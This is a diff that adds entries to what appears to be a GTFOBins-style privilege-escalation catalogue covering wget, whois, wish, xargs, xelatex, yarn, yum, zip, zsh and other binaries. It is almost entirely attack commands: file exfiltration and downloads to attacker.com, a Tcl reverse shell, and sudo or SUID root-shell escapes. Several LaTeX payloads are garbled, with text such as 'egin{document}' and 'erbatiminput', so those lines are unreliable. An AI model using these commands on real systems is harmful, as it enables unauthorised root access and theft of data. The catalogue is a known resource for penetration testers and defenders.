+wget --post-file=$LFILE $URL
+file-read:
+- description: The file to be read is treated as a list of URLs, one per line, which are actually fetched by `wget`. The content appears, somewhat modified, as error messages, thus this is not suitable to read arbitrary binary data.
+code: |
+LFILE=file_to_read
+wget -i $LFILE
+file-write:
+- description: The data to be written is treated as a list of URLs, one per line, which are actually fetched by `wget`. The data is written, somewhat modified, as error messages, thus this is not suitable to write arbitrary binary data.
+code: |
+LFILE=file_to_write
+TF=$(mktemp)
+echo DATA > $TF
+wget -i $TF -o $LFILE
+file-download:
+- description: Fetch a remote file via HTTP GET request.
+code: |
+URL=http://attacker.com/file_to_get
+LFILE=file_to_save
+wget $URL -O $LFILE
+suid:
+- description: Fetch a remote file via HTTP GET request.
+code: |
+URL=http://attacker.com/file_to_get
+LFILE=file_to_save
+./wget $URL -O $LFILE
+sudo:
+- description: Fetch a remote file via HTTP GET request.
+code: |
+URL=http://attacker.com/file_to_get
+LFILE=file_to_save
+sudo wget $URL -O $LFILE
+---
+description: The file is shown in an interactive TUI dialog made for displaying text, arrows can be used to scroll long content.
+functions:
+file-read:
+- code: |
+LFILE=file_to_read
+whiptail --textbox --scrolltext "$LFILE" 0 0
+suid:
+- code: |
+LFILE=file_to_read
+./whiptail --textbox --scrolltext "$LFILE" 0 0
+sudo:
+- code: |
+LFILE=file_to_read
+sudo whiptail --textbox --scrolltext "$LFILE" 0 0
+---
+description: |
+`whois` hangs waiting for the remote peer to close the socket.
+functions:
+file-upload:
+- description: Send a text file to a TCP port. Run `nc -l -p 12345 > "file_to_save"` on the attacker box to collect the file. The file has a trailing `$'\x0d\x0a'` and its length is limited by the maximum size of arguments.
+code: |
+RHOST=attacker.com
+RPORT=12345
+LFILE=file_to_send
+whois -h $RHOST -p $RPORT "`cat $LFILE`"
+- description: Send a binary file to a TCP port. Run `nc -l -p 12345 | tr -d $'\x0d' | base64 -d > "file_to_save"` on the attacker box to collect the file. The file length is limited by the maximum size of arguments.
+code: |
+RHOST=attacker.com
+RPORT=12345
+LFILE=file_to_send
+whois -h $RHOST -p $RPORT "`base64 $LFILE`"
+file-download:
+- description: Fetch remote text file from a remote TCP port. Run `nc -l -p 12345 < "file_to_send"` on the attacker box to send the file. The file has instances of `$'\x0d'` stripped.
+code: |
+RHOST=attacker.com
+RPORT=12345
+LFILE=file_to_save
+whois -h $RHOST -p $RPORT > "$LFILE"
+- description: Fetch remote binary file from a remote TCP port. Run `base64 "file_to_send" | nc -l -p 12345` on the attacker box to send the file.
+code: |
+RHOST=attacker.com
+RPORT=12345
+LFILE=file_to_save
+whois -h $RHOST -p $RPORT | base64 -d > "$LFILE"
+---
+functions:
+sudo:
+- description: |
+This technique can be used to write arbitrary files, i.e., the dump of one UDP packet.
+
+After starting Wireshark, and waiting for the capture to begin, deliver the UDP packet, e.g., with `nc` (see below). The capture then stops and the packet dump can be saved:
+
+1. select the only received packet;
+
+2. right-click on "Data" from the "Packet Details" pane, and select "Export Packet Bytes...";
+
+3. choose where to save the packet dump.
+code: |
+PORT=4444
+sudo wireshark -c 1 -i lo -k -f "udp port $PORT" &
+echo 'DATA' | nc -u 127.127.127.127 "$PORT"
+---
+functions:
+shell:
+- code: |
+wish
+exec /bin/sh <@stdin >@stdout 2>@stderr
+non-interactive-reverse-shell:
+- description: Run `nc -l -p 12345` on the attacker box to receive the shell.
+code: |
+export RHOST=attacker.com
+export RPORT=12345
+echo 'set s [socket $::env(RHOST) $::env(RPORT)];while 1 { puts -nonewline $s "> ";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | wish
+sudo:
+- code: |
+sudo wish
+exec /bin/sh <@stdin >@stdout 2>@stderr
+---
+functions:
+shell:
+- description: GNU version only.
+code: xargs -a /dev/null sh
+- code: echo x | xargs -Iy sh -c 'exec sh 0<&1'
+- description: Read interactively from `stdin`.
+code: |
+xargs -Ix sh -c 'exec sh 0<&1'
+x^D^D
+file-read:
+- description: This works as long as the file does not contain the NUL character, also a trailing `$'
+'` is added. The actual `/bin/echo` command is executed. GNU version only.
+code: |
+LFILE=file_to_read
+xargs -a "$LFILE" -0
+suid:
+- description: GNU version only.
+code: ./xargs -a /dev/null sh -p
+sudo:
+- description: GNU version only.
+code: sudo xargs -a /dev/null sh
+---
+description: This requires a running X server.
+functions:
+shell:
+- code: xdotool exec --sync /bin/sh
+suid:
+- code: ./xdotool exec --sync /bin/sh -p
+sudo:
+- code: sudo xdotool exec --sync /bin/sh
+---
+functions:
+shell:
+- code: |
+xelatex --shell-escape '\documentclass{article}egin{document}\immediate\write18{/bin/sh}nd{document}'
+file-read:
+- description: The read file will be part of the output.
+code: |
+xelatex '\documentclass{article}\usepackage{verbatim}egin{document}erbatiminput{file_to_read}nd{document}'
+strings article.dvi
+sudo:
+- description: The read file will be part of the output.
+code: |
+sudo xelatex '\documentclass{article}\usepackage{verbatim}egin{document}erbatiminput{file_to_read}nd{document}'
+strings article.dvi
+- code: |
+sudo xelatex --shell-escape '\documentclass{article}egin{document}\immediate\write18{/bin/sh}nd{document}'
+limited-suid:
+- code: |
+./xelatex --shell-escape '\documentclass{article}egin{document}\immediate\write18{/bin/sh}nd{document}'
+---
+functions:
+shell:
+- code: |
+xetex --shell-escape '\write18{/bin/sh}nd'
+sudo:
+- code: |
+sudo xetex --shell-escape '\write18{/bin/sh}nd'
+limited-suid:
+- code: |
+./xetex --shell-escape '\write18{/bin/sh}nd'
+---
+description: |
+The read file content is corrupted by error prints.
+functions:
+file-read:
+- code: |
+LFILE=file_to_read
+xmodmap -v $LFILE
+suid:
+- code: |
+LFILE=file_to_read
+./xmodmap -v $LFILE
+sudo:
+- code: |
+LFILE=file_to_read
+sudo xmodmap -v $LFILE
+---
+description: The file is displayed in a Xorg window, so it needs a working graphical environment.
+functions:
+file-read:
+- code: |
+LFILE=file_to_read
+xmore $LFILE
+suid:
+- code: |
+LFILE=file_to_read
+./xmore $LFILE
+sudo:
+- code: |
+LFILE=file_to_read
+sudo xmore $LFILE
+---
+description: This is a GUI application. The file content is displayed in a sticky note.
+functions:
+file-read:
+- code: |
+LFILE=file_to_read
+xpad -f "$LFILE"
+sudo:
+- code: |
+LFILE=file_to_read
+sudo xpad -f "$LFILE"
+---
+functions:
+file-write:
+- code: |
+LFILE=file_to_write
+echo DATA | xxd | xxd -r - "$LFILE"
+file-read:
+- code: |
+LFILE=file_to_read
+xxd "$LFILE" | xxd -r
+suid:
+- code: |
+LFILE=file_to_read
+./xxd "$LFILE" | xxd -r
+sudo:
+- code: |
+LFILE=file_to_read
+sudo xxd "$LFILE" | xxd -r
+---
+functions:
+file-read:
+- code: |
+LFILE=file_to_read
+xz -c "$LFILE" | xz -d
+suid:
+- code: |
+LFILE=file_to_read
+./xz -c "$LFILE" | xz -d
+sudo:
+- code: |
+LFILE=file_to_read
+sudo xz -c "$LFILE" | xz -d
+---
+functions:
+shell:
+- code: yarn exec /bin/sh
+- description: Additionally, arbitrary script names can be used in place of `preinstall` and triggered by name with, e.g., `yarn --cwd $TF run preinstall`.
+code: |
+TF=$(mktemp -d)
+echo '{"scripts": {"preinstall": "/bin/sh"}}' > $TF/package.json
+yarn --cwd $TF install
+sudo:
+- code: sudo yarn exec /bin/sh
+---
+functions:
+shell:
+- code: yash
+suid:
+- code: ./yash
+sudo:
+- code: sudo yash
+---
+functions:
+file-read:
+- description: This spawns a graphical window containing the file content somehow corrupted by word wrapping, it might not be suitable to read arbitrary files. The path must be absolute.
+code: |
+LFILE=file_to_read
+yelp "man:$LFILE"
+---
+functions:
+file-download:
+- description: Fetch a remote file via HTTP GET request. The file on the remote host must have an extension of `.rpm`, the content does not have to be an RPM file. The file will be downloaded to a randomly created directory in `/var/tmp`, for example `/var/tmp/yum-root-cR0O4h/`.
+code: |
+RHOST=attacker.com
+RFILE=file_to_get.rpm
+yum install http://$RHOST/$RFILE
+sudo:
+- description: |
+It runs commands using a specially crafted RPM package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.
+```
+TF=$(mktemp -d)
+echo 'id' > $TF/x.sh
+fpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF
+```
+code: |
+sudo yum localinstall -y x-1.0-1.noarch.rpm
+- description: |
+Spawn interactive root shell by loading a custom plugin.
+code: |
+TF=$(mktemp -d)
+cat >$TF/x<<EOF
+[main]
+plugins=1
+pluginpath=$TF
+pluginconfpath=$TF
+EOF
+
+cat >$TF/y.conf<<EOF
+[main]
+enabled=1
+EOF
+
+cat >$TF/y.py<<EOF
+import os
+import yum
+from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
+requires_api_version='2.1'
+def init_hook(conduit):
+os.execl('/bin/sh','/bin/sh')
+EOF
+
+sudo yum -c $TF/x --enableplugin=y
+---
+description: The interaction happens in a GUI window, while the shell is dropped in the terminal.
+functions:
+shell:
+- code: |
+zathura
+:! /bin/sh -c 'exec /bin/sh 0<&1'
+sudo:
+- code: |
+sudo zathura
+:! /bin/sh -c 'exec /bin/sh 0<&1'
+---
+functions:
+file-read:
+- code: |
+LFILE=file-to-read
+TF=$(mktemp -u)
+zip $TF $LFILE
+unzip -p $TF
+shell:
+- code: |
+TF=$(mktemp -u)
+zip $TF /etc/hosts -T -TT 'sh #'
+rm $TF
+sudo:
+- code: |
+TF=$(mktemp -u)
+sudo zip $TF /etc/hosts -T -TT 'sh #'
+sudo rm $TF
+limited-suid:
+- code: |
+TF=$(mktemp -u)
+./zip $TF /etc/hosts -T -TT 'sh #'
+sudo rm $TF
+---
+functions:
+file-read:
+- code: |
+export LFILE=file_to_read
+zsh -c 'echo "$(<$LFILE)"'
+file-write:
+- code: |
+export LFILE=file_to_write
+zsh -c 'echo DATA >$LFILE'
+shell:
+- code: zsh
+suid:
+- code: ./zsh
+sudo:
+- code: sudo zsh
+---
+description: The content is actually parsed and corrupted by the command, thus it may not be suitable for arbitrary files.
+functions:
+file-read:
+- code: |
+LFILE=file_to_read
+zsoelim "$LFILE"
+suid:
+- code: |
+LFILE=file_to_read
+./zsoelim "$LFILE"
+sudo:
+- code: |
+LFILE=file_to_read
+sudo zsoelim "$LFILE"
+---
+functions:
+shell:
+- description: This requires `/bin/sh` to be copied to `/usr/lib/zypper/commands/zypper-x` and this usually requires elevated privileges.
+code: |
+zypper x
+- code: |
+TF=$(mktemp -d)
+cp /bin/sh $TF/zypper-x
+export PATH=$TF:$PATH
+zypper x
+sudo:
+- description: This requires `/bin/sh` to be copied to `/usr/lib/zypper/commands/zypper-x` and this usually requires elevated privileges.
+code: |
+sudo zypper x
+- code: |
+TF=$(mktemp -d)
+cp /bin/sh $TF/zypper-x
+sudo PATH=$TF:$PATH zypper x
+---
